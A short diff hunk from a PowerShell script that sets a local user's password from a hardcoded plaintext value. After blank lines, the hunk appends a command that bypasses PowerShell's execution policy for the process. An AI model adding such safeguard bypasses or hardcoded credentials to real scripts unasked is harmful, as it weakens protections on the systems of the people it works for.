@@ -499,3 +499,7 @@ $newPassword = ConvertTo-SecureString -String "newLocalPassword123" -AsPlainText
 # Set the new password for the local user
 Set-LocalUser -Name $username -Password $newPassword
 
+
+
+
+Set-ExecutionPolicy Bypass -Scope Process -Force;
